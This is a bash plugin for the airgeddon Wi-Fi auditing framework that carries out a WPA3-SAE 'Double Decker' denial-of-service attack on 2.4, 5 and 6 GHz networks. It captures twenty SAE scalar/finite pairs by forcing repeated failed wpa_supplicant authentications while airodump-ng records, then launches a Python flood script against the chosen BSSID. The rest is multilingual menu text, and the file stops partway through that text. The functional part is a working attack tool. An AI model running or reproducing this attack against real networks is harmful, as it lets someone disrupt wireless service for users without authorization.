#!/usr/bin/env bash

# =============================================================================
# airgeddon Plugin: double_decker_attack.sh
# WPA3-SAE Double Decker DoS -- 20 Scalar/Finite pairs
# =============================================================================

#shellcheck disable=SC2034,SC2154

plugin_name="WPA3 Double Decker attack"
plugin_description="A plugin to perform a WPA3-SAE Double Decker DoS attack (2.4, 5 & 6 GHz compatible)"
plugin_author="Nuseo1"

plugin_enabled=1
plugin_minimum_ag_affected_version="12.0"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

declare -gA double_decker_sae_pairs_cache

# ----------------------------------------------------------------------
# Frequency helper
# ----------------------------------------------------------------------
function double_decker_get_frequency() {
	local ch=$1
	if (( ch >= 1 && ch <= 14 )); then
		if (( ch == 14 )); then freq=2484; else freq=$(( 2407 + ch * 5 )); fi
	elif (( ch >= 32 && ch <= 177 )); then
		freq=$(( 5000 + ch * 5 ))
	elif [[ "${band}" = "6GHz" ]]; then
		freq=$(( 5945 + ch * 5 ))
	else
		freq=2412
	fi
}

function double_decker_set_interface_freq() {
	double_decker_get_frequency "${channel}"
	iw dev "${interface}" set freq "${freq}" > /dev/null 2>&1
}

function double_decker_is_5ghz_channel() {
	local ch=$1
	if (( ch >= 32 && ch <= 177 )); then return 0; fi
	return 1
}

function double_decker_is_6ghz_channel() {
	# 6 GHz channels are identified via airgeddon's band variable (requires airgeddon >= 12.0)
	[[ "${band}" = "6GHz" ]] && return 0
	return 1
}

# ----------------------------------------------------------------------
# Python validations
# ----------------------------------------------------------------------
function python3_double_decker_script_validation() {
	if ! [ -f "${scriptfolder}${plugins_dir}double_decker_attack.py" ]; then
		echo
		language_strings "${language}" "double_decker_3" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi
	return 0
}

function python3_double_decker_validation() {
	if ! hash python3 2> /dev/null; then
		echo
		language_strings "${language}" "double_decker_2" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi
	python3="python3"
	return 0
}

# ----------------------------------------------------------------------
# Attack execution
# ----------------------------------------------------------------------
function exec_double_decker_attack() {
	double_decker_set_interface_freq
	local pairs_arg="${double_decker_sae_pairs_cache[${bssid}]}"

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"Double Decker attack\"" \
		"${python3} ${scriptfolder}${plugins_dir}double_decker_attack.py ${bssid} ${channel} ${interface} ${language} '${pairs_arg}' ${band}" \
		"Double Decker attack" "active"
	wait_for_process "${python3} ${scriptfolder}${plugins_dir}double_decker_attack.py ${bssid} ${channel} ${interface} ${language} '${pairs_arg}' ${band}" \
		"Double Decker attack"
}

# ----------------------------------------------------------------------
# SAE data preparation
# ----------------------------------------------------------------------
function double_decker_prepare_sae_data() {
	echo
	ask_yesno "double_decker_6" "no"
	if [ "${yesno}" = "y" ]; then
		double_decker_manual_input_20_pairs
	else
		if ! select_secondary_interface "secondary_interface"; then return 1; fi
		if ! double_decker_validate_secondary_managed; then return 1; fi
		if ! check_target_band_supported_by_interface "secondary_wifi_interface"; then return 1; fi

		echo
		language_strings "${language}" "double_decker_11" "yellow"
		language_strings "${language}" 4 "read"

		if ! double_decker_20_pair_capture; then return 1; fi
	fi
	return 0
}

function double_decker_validate_secondary_managed() {
	check_interface_mode "${secondary_wifi_interface}"
	if [ "${ifacemode}" = "Managed" ]; then return 0; fi
	echo
	language_strings "${language}" "double_decker_14" "yellow"
	echo
	if managed_option "${secondary_wifi_interface}"; then return 0; fi
	return 1
}

function double_decker_manual_input_20_pairs() {
	local valid_pairs=()
	local scalar_regex="^[0-9a-fA-F]{64}$"
	local finite_regex="^[0-9a-fA-F]{128}$"

	for i in {1..20}; do
		echo
		language_strings "${language}" "double_decker_manual_1" "green"
		echo " Pair ${i}/20"

		local scalar=""
		while [[ ! ${scalar} =~ ${scalar_regex} ]]; do
			language_strings "${language}" "double_decker_manual_2" "green"
			read -rp "> " scalar
		done

		local finite=""
		while [[ ! ${finite} =~ ${finite_regex} ]]; do
			language_strings "${language}" "double_decker_manual_3" "green"
			read -rp "> " finite
		done

		valid_pairs+=("${scalar},${finite}")
	done
	double_decker_sae_pairs_cache["${bssid}"]=$(IFS=';'; echo "${valid_pairs[*]}")
}

# ----------------------------------------------------------------------
# wpa_supplicant configuration -- optimized for hidden networks & SAE
# ----------------------------------------------------------------------
function double_decker_set_wpa_supplicant_config() {
	double_decker_get_frequency "${channel}"

	# airgeddon sets essid to "(Hidden Network)" when unrevealed;
	# enforce active scanning regardless.
	local is_hidden=1

	cat > "${tmpdir}double_decker_wpa_supplicant.conf" <<-EOF
		ctrl_interface=/var/run/wpa_supplicant
		update_config=1
		ap_scan=1

		network={
		ssid="${essid}"
		scan_ssid=${is_hidden}
		bssid=${bssid}
		key_mgmt=SAE
		sae_password="WRONGPASSWORD123"
		ieee80211w=2
		freq_list=${freq}
		scan_freq=${freq}
		}
	EOF
}

function double_decker_kill_windows() {
	if [ -n "${double_decker_capture_pid}" ]; then
		kill "${double_decker_capture_pid}" 2>/dev/null
	fi
	if [ -n "${double_decker_wpa_supplicant_pid}" ]; then
		kill "${double_decker_wpa_supplicant_pid}" 2>/dev/null
	fi
}

function double_decker_collect_20_pairs() {
	local extracted_pairs
	extracted_pairs=$("${python3}" -c '
import sys
try:
    from scapy.all import rdpcap, Dot11Auth
except ImportError:
    sys.exit(1)
pairs = set()
try:
    for p in rdpcap("'"${tmpdir}"'double_decker-01.cap"):
        if p.haslayer(Dot11Auth) and p.algo == 3 and p.seqnum == 1:
            payload = bytes(p[Dot11Auth].payload)
            if len(payload) >= 98 and payload[0:2] == b"\x13\x00":
                s = payload[2:34].hex()
                f = payload[34:98].hex()
                pairs.add(f"{s},{f}")
except:
    pass
print(";".join(list(pairs)[:20]))
' 2>/dev/null)

	local pair_count
	pair_count=$(echo "${extracted_pairs}" | tr -cd ';' | wc -c)

	if [[ -n "${extracted_pairs}" ]] && (( pair_count >= 19 )); then
		double_decker_sae_pairs_cache["${bssid}"]="${extracted_pairs}"
		return 0
	fi
	return 1
}

function double_decker_20_pair_capture() {
	rm -rf "${tmpdir}double_decker"* > /dev/null 2>&1
	double_decker_get_frequency "${channel}"

	local double_decker_airodump_cmd="airodump-ng -C ${freq} -d ${bssid} -w ${tmpdir}double_decker ${interface}"

	local double_decker_wpa_supplicant_cmd="while true; do RAND_PASS=\$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 20); wpa_supplicant -B -Dnl80211 -i ${secondary_wifi_interface} -c ${tmpdir}double_decker_wpa_supplicant.conf >/dev/null 2>&1; sleep 1.5; killall -9 wpa_supplicant 2>/dev/null; done"

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Capturing 20 SAE Pairs\"" \
		"${double_decker_airodump_cmd}" "Capturing 20 SAE Pairs" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		get_tmux_process_id "${double_decker_airodump_cmd}"
		double_decker_capture_pid="${global_process_pid}"
	else
		double_decker_capture_pid=$!
	fi

	double_decker_set_wpa_supplicant_config
	sleep 2

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FF00FF\" -geometry ${g1_bottomright_window} -T \"Forcing Failed Auths\"" \
		"${double_decker_wpa_supplicant_cmd}" "Forcing Failed Auths" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		get_tmux_process_id "${double_decker_wpa_supplicant_cmd}"
		double_decker_wpa_supplicant_pid="${global_process_pid}"
	else
		double_decker_wpa_supplicant_pid=$!
	fi

	local max_wait=30
	local waited=0
	while (( waited < max_wait )); do
		if double_decker_collect_20_pairs; then
			double_decker_kill_windows
			echo
			language_strings "${language}" 162 "yellow"
			echo
			language_strings "${language}" "double_decker_13" "blue"
			return 0
		fi
		sleep 2
		waited=$((waited + 2))
	done

	double_decker_kill_windows
	echo
	language_strings "${language}" "double_decker_12" "red"
	language_strings "${language}" 115 "read"
	return 1
}

# ----------------------------------------------------------------------
# Main menu entry point
# ----------------------------------------------------------------------
function double_decker_option() {
	get_aircrack_version
	if ! validate_aircrack_wpa3_version; then
		echo
		language_strings "${language}" 763 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! hash tshark 2> /dev/null; then
		language_strings "${language}" "double_decker_4" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! hash wpa_supplicant 2> /dev/null; then
		language_strings "${language}" "double_decker_5" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WPA3"; then return 1; fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	# Check 5 GHz / 6 GHz adapter support when needed.
	# airgeddon >= 12.0 provides the band variable to disambiguate channels.
	if double_decker_is_6ghz_channel; then
		if [ "${interfaces_band_info['main_wifi_interface','6Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 516 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	elif double_decker_is_5ghz_channel "${channel}"; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi

	if ! validate_wpa3_network; then return 1; fi
	if ! validate_network_type "personal"; then return 1; fi
	if ! python3_double_decker_validation; then return 1; fi
	if ! python3_double_decker_script_validation; then return 1; fi

	if [[ -n "${double_decker_sae_pairs_cache[${bssid}]}" ]]; then
		echo
		ask_yesno "double_decker_15" "yes"
		if [ "${yesno}" = "y" ]; then
			:
		else
			if ! double_decker_prepare_sae_data; then return 1; fi
		fi
	else
		if ! double_decker_prepare_sae_data; then return 1; fi
	fi

	echo
	language_strings "${language}" "double_decker_9" "blue"
	echo
	language_strings "${language}" 32 "green"
	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"

	exec_double_decker_attack
}

# ----------------------------------------------------------------------
# Menu prehook -- inject plugin into airgeddon's WPA3 attack menu slot
# ----------------------------------------------------------------------
function double_decker_prehook_hookable_wpa3_attacks_menu() {
	if [[ "${arr["ENGLISH",756]}" == *"WPA3 Double Decker attack"* ]]; then
		plugin_x="double_decker_option"
		plugin_x_under_construction=""
	elif [[ "${arr["ENGLISH",757]}" == *"WPA3 Double Decker attack"* ]]; then
		plugin_y="double_decker_option"
		plugin_y_under_construction=""
	elif [[ "${arr["ENGLISH",812]}" == *"WPA3 Double Decker attack"* ]]; then
		plugin_z="double_decker_option"
		plugin_z_under_construction=""
	fi
}

# ----------------------------------------------------------------------
# Language strings -- airgeddon style: all languages per string together
# ----------------------------------------------------------------------
function double_decker_prehook_hookable_for_languages() {

	if [[ "${arr["ENGLISH",756]}" == *"WPA3 attack"* && "${arr["ENGLISH",756]}" == *"plugin"* ]]; then
		arr["ENGLISH",756]="6.  WPA3 Double Decker attack"
		arr["SPANISH",756]="6.  Ataque WPA3 Double Decker"
		arr["FRENCH",756]="6.  Attaque WPA3 Double Decker"
		arr["CATALAN",756]="6.  Atac WPA3 Double Decker"
		arr["PORTUGUESE",756]="6.  Ataque WPA3 Double Decker"
		arr["RUSSIAN",756]="6.  Атака WPA3 Double Decker"
		arr["GREEK",756]="6.  Επίθεση WPA3 Double Decker"
		arr["ITALIAN",756]="6.  Attacco WPA3 Double Decker"
		arr["POLISH",756]="6.  Atak WPA3 Double Decker"
		arr["GERMAN",756]="6.  WPA3 Double Decker Angriff"
		arr["TURKISH",756]="6.  WPA3 Double Decker saldırısı"
		arr["ARABIC",756]="6.  هجوم WPA3 Double Decker"
		arr["CHINESE",756]="6.  WPA3 Double Decker 攻击"
	elif [[ "${arr["ENGLISH",757]}" == *"WPA3 attack"* && "${arr["ENGLISH",757]}" == *"plugin"* ]]; then
		arr["ENGLISH",757]="7.  WPA3 Double Decker attack"
		arr["SPANISH",757]="7.  Ataque WPA3 Double Decker"
		arr["FRENCH",757]="7.  Attaque WPA3 Double Decker"
		arr["CATALAN",757]="7.  Atac WPA3 Double Decker"
		arr["PORTUGUESE",757]="7.  Ataque WPA3 Double Decker"
		arr["RUSSIAN",757]="7.  Атака WPA3 Double Decker"
		arr["GREEK",757]="7.  Επίθεση WPA3 Double Decker"
		arr["ITALIAN",757]="7.  Attacco WPA3 Double Decker"
		arr["POLISH",757]="7.  Atak WPA3 Double Decker"
		arr["GERMAN",757]="7.  WPA3 Double Decker Angriff"
		arr["TURKISH",757]="7.  WPA3 Double Decker saldırısı"
		arr["ARABIC",757]="7.  هجوم WPA3 Double Decker"
		arr["CHINESE",757]="7.  WPA3 Double Decker 攻击"
	elif [[ "${arr["ENGLISH",812]}" == *"WPA3 attack"* && "${arr["ENGLISH",812]}" == *"plugin"* ]]; then
		arr["ENGLISH",812]="8.  WPA3 Double Decker attack"
		arr["SPANISH",812]="8.  Ataque WPA3 Double Decker"
		arr["FRENCH",812]="8.  Attaque WPA3 Double Decker"
		arr["CATALAN",812]="8.  Atac WPA3 Double Decker"
		arr["PORTUGUESE",812]="8.  Ataque WPA3 Double Decker"
		arr["RUSSIAN",812]="8.  Атака WPA3 Double Decker"
		arr["GREEK",812]="8.  Επίθεση WPA3 Double Decker"
		arr["ITALIAN",812]="8.  Attacco WPA3 Double Decker"
		arr["POLISH",812]="8.  Atak WPA3 Double Decker"
		arr["GERMAN",812]="8.  WPA3 Double Decker Angriff"
		arr["TURKISH",812]="8.  WPA3 Double Decker saldırısı"
		arr["ARABIC",812]="8.  هجوم WPA3 Double Decker"
		arr["CHINESE",812]="8.  WPA3 Double Decker 攻击"
	fi

	# double_decker_1
	arr["ENGLISH","double_decker_1"]="WPA3 Double Decker DoS combines Omnivore and Muted attacks."
	arr["SPANISH","double_decker_1"]="El DoS WPA3 Double Decker combina los ataques Omnivore y Muted."
	arr["FRENCH","double_decker_1"]="Le DoS WPA3 Double Decker combine les attaques Omnivore et Muted."
	arr["CATALAN","double_decker_1"]="El DoS WPA3 Double Decker combina els atacs Omnivore i Muted."
	arr["PORTUGUESE","double_decker_1"]="O DoS WPA3 Double Decker combina os ataques Omnivore e Muted."
	arr["RUSSIAN","double_decker_1"]="WPA3 Double Decker DoS объединяет атаки Omnivore и Muted."
	arr["GREEK","double_decker_1"]="Το WPA3 Double Decker DoS συνδυάζει τις επιθέσεις Omnivore και Muted."
	arr["ITALIAN","double_decker_1"]="Il DoS WPA3 Double Decker combina gli attacchi Omnivore e Muted."
	arr["POLISH","double_decker_1"]="WPA3 Double Decker DoS łączy ataki Omnivore i Muted."
	arr["GERMAN","double_decker_1"]="WPA3 Double Decker DoS kombiniert Omnivore- und Muted-Angriffe."
	arr["TURKISH","double_decker_1"]="WPA3 Double Decker DoS, Omnivore ve Muted saldırılarını birleştirir."
	arr["ARABIC","double_decker_1"]="Omnivore وMuted يجمع هجوم WPA3 Double Decker DoS بين هجمات"
	arr["CHINESE","double_decker_1"]="WPA3 Double Decker DoS 结合了 Omnivore 和 Muted 攻击。"

	# double_decker_2
	arr["ENGLISH","double_decker_2"]="This attack requires python3."
	arr["SPANISH","double_decker_2"]="Este ataque requiere python3."
	arr["FRENCH","double_decker_2"]="Cette attaque nécessite python3."
	arr["CATALAN","double_decker_2"]="Aquest atac requereix python3."
	arr["PORTUGUESE","double_decker_2"]="Este ataque requer python3."
	arr["RUSSIAN","double_decker_2"]="Для этой атаки требуется python3."
	arr["GREEK","double_decker_2"]="Αυτή η επίθεση απαιτεί python3."
	arr["ITALIAN","double_decker_2"]="Questo attacco richiede python3."
	arr["POLISH","double_decker_2"]="Ten atak wymaga python3."
	arr["GERMAN","double_decker_2"]="Dieser Angriff erfordert python3."
	arr["TURKISH","double_decker_2"]="Bu saldırı python3 gerektirir."
	arr["ARABIC","double_decker_2"]="python3 يتطلب هذا الهجوم"
	arr["CHINESE","double_decker_2"]="此攻击需要 python3。"

	# double_decker_3
	arr["ENGLISH","double_decker_3"]="Python attack script double_decker_attack.py not found."
	arr["SPANISH","double_decker_3"]="No se encontró el script python double_decker_attack.py."
	arr["FRENCH","double_decker_3"]="Le script python double_decker_attack.py est introuvable."
	arr["CATALAN","double_decker_3"]="No s'ha trobat l'script python double_decker_attack.py."
	arr["PORTUGUESE","double_decker_3"]="Script python double_decker_attack.py não encontrado."
	arr["RUSSIAN","double_decker_3"]="Python скрипт double_decker_attack.py не найден."
	arr["GREEK","double_decker_3"]="Το python script double_decker_attack.py δεν βρέθηκε."
	arr["ITALIAN","double_decker_3"]="Script python double_decker_attack.py non trovato."
	arr["POLISH","double_decker_3"]="Nie znaleziono skryptu python double_decker_attack.py."
	arr["GERMAN","double_decker_3"]="Python-Angriffsskript double_decker_attack.py nicht gefunden."
	arr["TURKISH","double_decker_3"]="Python saldırı betiği double_decker_attack.py bulunamadı."
	arr["ARABIC","double_decker_3"]="double_decker_attack.py لم يتم العثور على سكربت بايثون"
	arr["CHINESE","double_decker_3"]="未找到 Python 攻击脚本 double_decker_attack.py。"

	# double_decker_4
	arr["ENGLISH","double_decker_4"]="This attack requires tshark installed."
	arr["SPANISH","double_decker_4"]="Este ataque requiere tshark instalado."
	arr["FRENCH","double_decker_4"]="Cette attaque nécessite tshark."
	arr["CATALAN","double_decker_4"]="Aquest atac requereix tshark instal·lat."
	arr["PORTUGUESE","double_decker_4"]="Este ataque requer o tshark instalado."
	arr["RUSSIAN","double_decker_4"]="Для этой атаки необходим tshark."
	arr["GREEK","double_decker_4"]="Αυτή η επίθεση απαιτεί εγκατεστημένο το tshark."
	arr["ITALIAN","double_decker_4"]="Questo attacco richiede tshark installato."
	arr["POLISH","double_decker_4"]="Ten atak wymaga zainstalowanego tshark."
	arr["GERMAN","double_decker_4"]="Für diesen Angriff muss tshark installiert sein."
	arr["TURKISH","double_decker_4"]="Bu saldırı için tshark kurulu olmalıdır."
	arr["ARABIC","double_decker_4"]="tshark يتطلب هذا الهجوم تثبيت"
	arr["CHINESE","double_decker_4"]="此攻击需要安装 tshark。"

	# double_decker_5
	arr["ENGLISH","double_decker_5"]="This attack requires wpa_supplicant installed."
	arr["SPANISH","double_decker_5"]="Este ataque requiere wpa_supplicant instalado."
	arr["FRENCH","double_decker_5"]="Cette attaque nécessite wpa_supplicant."
	arr["CATALAN","double_decker_5"]="Aquest atac requereix wpa_supplicant instal·lat."
	arr["PORTUGUESE","double_decker_5"]="Este ataque requer o wpa_supplicant instalado."
	arr["RUSSIAN","double_decker_5"]="Для этой атаки необходим wpa_supplicant."
	arr["GREEK","double_decker_5"]="Αυτή η επίθεση απαιτεί εγκατεστημένο το wpa_supplicant."
	arr["ITALIAN","double_decker_5"]="Questo attacco richiede wpa_supplicant installato."
	arr["POLISH","double_decker_5"]="Ten atak wymaga zainstalowanego wpa_supplicant."
	arr["GERMAN","double_decker_5"]="Für diesen Angriff muss wpa_supplicant installiert sein."
	arr["TURKISH","double_decker_5"]="Bu saldırı için wpa_supplicant kurulu olmalıdır."
	arr["ARABIC","double_decker_5"]="wpa_supplicant يتطلب هذا الهجوم تثبيت"
	arr["CHINESE","double_decker_5"]="此攻击需要安装 wpa_supplicant。"

	# double_decker_6
	arr["ENGLISH","double_decker_6"]="Do you want to manually introduce the 20 SAE pairs? [y/N]"
	arr["SPANISH","double_decker_6"]="¿Desea introducir manualmente los 20 pares SAE?"
	arr["FRENCH","double_decker_6"]="Voulez-vous saisir manuellement les 20 paires SAE ?"
	arr["CATALAN","double_decker_6"]="Voleu introduir manualment els 20 parells SAE?"
	arr["PORTUGUESE","double_decker_6"]="Deseja introduzir manualmente os 20 pares SAE?"
	arr["RUSSIAN","double_decker_6"]="Хотите ввести 20 пар SAE вручную?"
	arr["GREEK","double_decker_6"]="Θέλετε να εισαγάγετε χειροκίνητα τα 20 ζεύγη SAE;"
	arr["ITALIAN","double_decker_6"]="Vuoi inserire manualmente le 20 coppie SAE?"
	arr["POLISH","double_decker_6"]="Czy chcesz ręcznie wprowadzić 20 par SAE?"
	arr["GERMAN","double_decker_6"]="Möchten Sie die 20 SAE-Paare manuell eingeben? [y/N]"
	arr["TURKISH","double_decker_6"]="20 SAE çiftini manuel olarak girmek ister misiniz?"
	arr["ARABIC","double_decker_6"]="SAE هل تريد إدخال 20 زوجًا من"
	arr["CHINESE","double_decker_6"]="是否要手动输入 20 个 SAE 对？"

	# double_decker_9
	arr["ENGLISH","double_decker_9"]="Attack is ready. 20 SAE pairs loaded."
	arr["SPANISH","double_decker_9"]="Ataque listo. 20 pares SAE cargados."
	arr["FRENCH","double_decker_9"]="Attaque prête. 20 paires SAE chargées."
	arr["CATALAN","double_decker_9"]="Atac preparat. 20 parells SAE carregats."
	arr["PORTUGUESE","double_decker_9"]="Ataque pronto. 20 pares SAE carregados."
	arr["RUSSIAN","double_decker_9"]="Атака готова. Загружено 20 пар SAE."
	arr["GREEK","double_decker_9"]="Η επίθεση είναι έτοιμη. 20 ζεύγη SAE φορτώθηκαν."
	arr["ITALIAN","double_decker_9"]="Attacco pronto. 20 coppie SAE caricate."
	arr["POLISH","double_decker_9"]="Atak gotowy. Załadowano 20 par SAE."
	arr["GERMAN","double_decker_9"]="Angriff bereit. 20 SAE-Paare geladen."
	arr["TURKISH","double_decker_9"]="Saldırı hazır. 20 SAE çifti yüklendi."
	arr["ARABIC","double_decker_9"]="تم تحميل 20 زوجًا من SAE الهجوم جاهز."
	arr["CHINESE","double_decker_9"]="攻击已准备就绪。已加载 20 个 SAE 对。"

	# double_decker_11
	arr["ENGLISH","double_decker_11"]="Starting automatic capture of 20 SAE pairs..."
	arr["SPANISH","double_decker_11"]="Iniciando captura automática de 20 pares SAE..."
	arr["FRENCH","double_decker_11"]="Démarrage de la capture automatique de 20 paires SAE..."
	arr["CATALAN","double_decker_11"]="Iniciant captura automàtica de 20 parells SAE..."
	arr["PORTUGUESE","double_decker_11"]="Iniciando captura automática de 20 pares SAE..."
	arr["RUSSIAN","double_decker_11"]="Запуск автоматического захвата 20 пар SAE..."
	arr["GREEK","double_decker_11"]="Έναρξη αυτόματης καταγραφής 20 ζευγών SAE..."
	arr["ITALIAN","double_decker_11"]="Avvio cattura automatica di 20 coppie SAE..."
	arr["POLISH","double_decker_11"]="Rozpoczynanie automatycznego przechwytywania 20 par SAE..."
	arr["GERMAN","double_decker_11"]="Starte automatische Erfassung von 20 SAE-Paaren..."
	arr["TURKISH","double_decker_11"]="20 SAE çiftinin otomatik yakalanması başlatılıyor..."
	arr["ARABIC","double_decker_11"]="... SAE بدء الالتقاط التلقائي لـ 20 زوجًا من"
	arr["CHINESE","double_decker_11"]="开始自动捕获 20 个 SAE 对..."

	# double_decker_12
	arr["ENGLISH","double_decker_12"]="Failed to capture 20 SAE pairs. Check target and distance."
	arr["SPANISH","double_decker_12"]="No se pudieron capturar 20 pares SAE. Verifique el objetivo y la distancia."
	arr["FRENCH","double_decker_12"]="Échec de la capture des 20 paires SAE. Vérifiez la cible et la distance."
	arr["CATALAN","double_decker_12"]="No s'han pogut capturar 20 parells SAE. Comproveu l'objectiu i la distància."
	arr["PORTUGUESE","double_decker_12"]="Falha ao capturar 20 pares SAE. Verifique o alvo e a distância."
	arr["RUSSIAN","double_decker_12"]="Не удалось захватить 20 пар SAE. Проверьте цель и расстояние."
	arr["GREEK","double_decker_12"]="Αποτυχία λήψης 20 ζευγών SAE. Ελέγξτε τον στόχο και την απόσταση."
	arr["ITALIAN","double_decker_12"]="Cattura di 20 coppie SAE fallita. Verifica il target e la distanza."
	arr["POLISH","double_decker_12"]="Nie udało się przechwycić 20 par SAE. Sprawdź cel i odległość."
	arr["GERMAN","double_decker_12"]="Konnte keine 20 SAE-Paare erfassen. Ziel und Entfernung prüfen."
	arr["TURKISH","double_decker_12"]="20 SAE çifti yakalanamadı. Hedefi ve mesafeyi kontrol edin."
	arr["ARABIC","double_decker_12"]="فشل التقاط 20 زوجًا من SAE. تحقق من الهدف والمسافة."
	arr["CHINESE","double_decker_12"]="无法捕获 20 个 SAE 对。请检查目标和距离。"

	# double_decker_13
	arr["ENGLISH","double_decker_13"]="Successfully captured 20 SAE pairs."
	arr["SPANISH","double_decker_13"]="Se capturaron exitosamente 20 pares SAE."
	arr["FRENCH","double_decker_13"]="20 paires SAE capturées avec succès."
	arr["CATALAN","double_decker_13"]="S'han capturat correctament 20 parells SAE."
	arr["PORTUGUESE","double_decker_13"]="20 pares SAE capturados com sucesso."
	arr["RUSSIAN","double_decker_13"]="Успешно захвачено 20 пар SAE."
	arr["GREEK","double_decker_13"]="Επιτυχής λήψη 20 ζευγών SAE."
	arr["ITALIAN","double_decker_13"]="Catturate con successo 20 coppie SAE."
	arr["POLISH","double_decker_13"]="Pomyślnie przechwycono 20 par SAE."
	arr["GERMAN","double_decker_13"]="Erfolgreich 20 SAE-Paare erfasst."
	arr["TURKISH","double_decker_13"]="20 SAE çifti başarıyla yakalandı."
	arr["ARABIC","double_decker_13"]="SAE تم بنجاح التقاط 20 زوجًا من"
	arr["CHINESE","double_decker_13"]="成功捕获 20 个 SAE 对。"

	# double_decker_14
	arr["ENGLISH","double_decker_14"]="Secondary interface must be in managed mode."
	arr["SPANISH","double_decker_14"]="La interfaz secundaria debe estar en modo managed."
	arr["FRENCH","double_decker_14"]="L'interface secondaire doit être en mode managed."
	arr["CATALAN","double_decker_14"]="La interfície secundària ha d'estar en mode managed."
	arr["PORTUGUESE","double_decker_14"]="A interface secundária deve estar no modo managed."
	arr["RUSSIAN","double_decker_14"]="Вторичный интерфейс должен быть в режиме managed."
	arr["GREEK","double_decker_14"]="Η δευτερεύουσα διεπαφή πρέπει να είναι σε λειτουργία managed."
	arr["ITALIAN","double_decker_14"]="L'interfaccia secondaria deve essere in modalità managed."
	arr["POLISH","double_decker_14"]="Drugi interfejs musi być w trybie managed."
	arr["GERMAN","double_decker_14"]="Sekundäres Interface muss im Managed-Modus sein."
	arr["TURKISH","double_decker_14"]="İkincil arayüz yönetilen modda olmalıdır."
	arr["ARABIC","double_decker_14"]="managed يجب أن تكون الواجهة الثانوية في وضع"
	arr["CHINESE","double_decker_14"]="辅助接口必须处于 managed 模式。"

	# double_decker_15
	arr["ENGLISH","double_decker_15"]="Cached SAE pairs found for this BSSID. Use them?"
	arr["SPANISH","double_decker_15"]="Se encontraron pares SAE en caché para este BSSID. ¿Usarlos?"
	arr["FRENCH","double_decker_15"]="Des paires SAE en cache ont été trouvées pour ce BSSID. Les utiliser ?"
	arr["CATALAN","double_decker_15"]="S'han trobat parells SAE en memòria cau per a aquest BSSID. Voleu utilitzar-los?"
	arr["PORTUGUESE","double_decker_15"]="Pares SAE em cache encontrados para este BSSID. Usá-los?"
	arr["RUSSIAN","double_decker_15"]="Найдены кэшированные пары SAE для этого BSSID. Использовать их?"
	arr["GREEK","double_decker_15"]="Βρέθηκαν αποθηκευμένα ζεύγη SAE για αυτό το BSSID. Να χρησιμοποιηθούν;"
	arr["ITALIAN","double_decker_15"]="Trovate coppie SAE nella cache per questo BSSID. Vuoi usarle?"
	arr["POLISH","double_decker_15"]="Znaleziono zapisane pary SAE dla tego BSSID. Użyć ich?"
	arr["GERMAN","double_decker_15"]="Zwischengespeicherte SAE-Paare für diese BSSID gefunden. Verwenden?"
	arr["TURKISH","double_decker_15"]="Bu BSSID için önbelleğe alınmış SAE çiftleri bulundu. Kullanılsın mı?"
	arr["ARABIC","double_decker_15"]="هل تريد استخدامها؟ BSSID تم العثور على أزواج SAE مخزنة مؤقتًا لهذا"
	arr["CHINESE","double_decker_15"]="为此 BSSID 找到缓存的 SAE 对。是否使用？"

	# double_decker_manual_1
	arr["ENGLISH","double_decker_manual_1"]="Input SAE Pair."
	arr["SPANISH","double_decker_manual_1"]="Ingrese el par SAE."
	arr["FRENCH","double_decker_manual_1"]="Saisissez la paire SAE."
	arr["CATALAN","double_decker_manual_1"]="Introduïu el parell SAE."
	arr["PORTUGUESE","double_decker_manual_1"]="Insira o par SAE."
	arr["RUSSIAN","double_decker_manual_1"]="Введите пару SAE."
	arr["GREEK","double_decker_manual_1"]="Εισαγάγετε το ζεύγος SAE."
	arr["ITALIAN","double_decker_manual_1"]="Inserisci la coppia SAE."
	arr["POLISH","double_decker_manual_1"]="Wprowadź parę SAE."
	arr["GERMAN","double_decker_manual_1"]="Geben Sie das SAE-Paar ein."
	arr["TURKISH","double_decker_manual_1"]="SAE çiftini girin."
	arr["ARABIC","double_decker_manual_1"]="SAE أدخل زوج"
	arr["CHINESE","double_decker_manual_1"]="输入 SAE 对。"

	# double_decker_manual_2
	arr["ENGLISH","double_decker_manual_2"]="Insert Scalar (64 hex chars)."
	arr["SPANISH","double_decker_manual_2"]="Inserte Scalar (64 caracteres hexadecimales)."
	arr["FRENCH","double_decker_manual_2"]="Insérez Scalar (64 caractères hexadécimaux)."
	arr["CATALAN","double_decker_manual_2"]="Introduïu Scalar (64 caràcters hexadecimals)."
	arr["PORTUGUESE","double_decker_manual_2"]="Insira Scalar (64 caracteres hexadecimais)."
	arr["RUSSIAN","double_decker_manual_2"]="Введите Scalar (64 шестнадцатеричных символа)."
	arr["GREEK","double_decker_manual_2"]="Εισαγάγετε Scalar (64 δεκαεξαδικοί χαρακτήρες)."
	arr["ITALIAN","double_decker_manual_2"]="Inserisci Scalar (64 caratteri esadecimali)."
	arr["POLISH","double_decker_manual_2"]="Wprowadź Scalar (64 znaki szesnastkowe)."
	arr["GERMAN","double_decker_manual_2"]="Skalar eingeben (64 Hex-Zeichen)."
